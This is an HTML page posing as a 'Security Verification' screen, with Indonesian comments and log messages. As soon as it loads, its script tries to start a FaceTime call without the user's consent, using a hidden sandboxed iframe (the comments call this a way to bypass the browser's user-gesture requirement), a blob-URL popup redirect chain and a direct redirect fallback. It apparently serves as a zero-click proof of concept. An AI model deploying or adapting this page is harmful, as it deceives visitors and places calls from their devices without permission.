<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center;
  }
  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
  h2 { color: #333; margin-bottom: 10px; }
  p { color: #666; font-size: 14px; margin-bottom: 20px; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; height: 120px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Security Verification</h2>
  <p>Memproses...</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. KONFIGURASI FACETIME
  // ============================================
  // Target: Email atau Nomor Telepon
  var TARGET = "security@apple.com"; 
  
  // Scheme FaceTime (Gunakan facetime-prompt:// untuk beberapa versi macOS)
  var FACETIME_SCHEME = "facetime://" + TARGET;

  // ============================================
  // 2. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
  // ============================================
  window.addEventListener('load', function() {
    if (executed) return;
    executed = true;

    log("[!] Memulai Zero-Click FaceTime Call...");

    // ============================================
    // A. IFRAME SANDBOX (BYPASS GESTURE)
    // ============================================
    setTimeout(function() {
      try {
        log("[+] Mengirim FaceTime via Iframe...");
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        iframe.src = FACETIME_SCHEME;
        document.getElementById("launcher-container").appendChild(iframe);
      } catch(e) {
        log("[-] Iframe Error: " + e.message);
      }
    }, 100);

    // ============================================
    // B. BLOB REDIRECT CHAIN (TOP-LEVEL)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim Blob Redirect Chain...");
      try {
        var blobPayload = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              // Redirect ke FaceTime
              window.location.replace("${FACETIME_SCHEME}");
            <\/script>
          </body>
          </html>
        `;
        var blob = new Blob([blobPayload], { type: 'text/html' });
        var blobUrl = URL.createObjectURL(blob);
        
        var win = window.open(blobUrl, '_blank');
        if (win) {
          log("[+] Blob Redirect Triggered.");
        } else {
          log("[-] Popup diblokir.");
        }
      } catch(e) {
        log("[-] Blob Error: " + e.message);
      }
    }, 500);

    // ============================================
    // C. DIRECT TOP-LEVEL (FALLBACK)
    // ============================================
    setTimeout(function() {
      log("[+] Mengirim Direct FaceTime Scheme...");
      try {
        window.location.replace(FACETIME_SCHEME);
      } catch(e) {}
    }, 1000);

  });

})();
</script>
</body>
</html>
